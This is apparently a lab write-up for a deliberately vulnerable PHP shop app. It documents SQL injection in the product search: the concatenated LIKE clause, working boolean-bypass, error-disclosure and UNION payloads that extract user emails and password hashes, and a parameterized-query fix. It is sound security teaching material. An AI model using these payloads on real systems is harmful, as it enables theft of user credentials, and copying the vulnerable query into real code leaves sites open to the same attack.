# 02 — SQL Injection: Product Search

## Endpoint
GET /products.php?search=...

## Vulnerability
The search string is concatenated into the LIKE clause.

## Vulnerable code
File: `app/models/Product.php` → `getAll()` (vulnerable branch)

    AND p.name LIKE '%$search%'

## Attack 1 — Boolean bypass
    /products.php?search=' OR '1'='1

Result: every product returned because `'1'='1'` is always true.
Verified in browser. ✅

## Attack 2 — Error disclosure
    /products.php?search='

Result: raw MySQL error displayed to the attacker (info leak).
Verified. ✅

## Attack 3 — UNION data extraction (optional)
With URL-encoded payload, user rows can be appended to the product
result set. Payload:

    nonexistent' UNION SELECT id,email,password_hash,0,0,0,'','x' FROM users#

If the app's trailing ORDER BY survives, MySQL errors with:
"Table 'p' from one of the SELECTs cannot be used in global ORDER clause"
— which itself proves the UNION is being parsed by MySQL.

## Defense (secure mode)
File: `app/models/Product.php` → `getAll()` (secure branch)

    $sql .= " AND p.name LIKE ?";
    $params[] = "%" . $search . "%";
    $stmt = $this->db->prepare($sql);
    $stmt->execute($params);

## Verified
- VULNERABLE: `' OR '1'='1` returns all products. ✅
- SECURE:     same payload returns "No products found". ✅
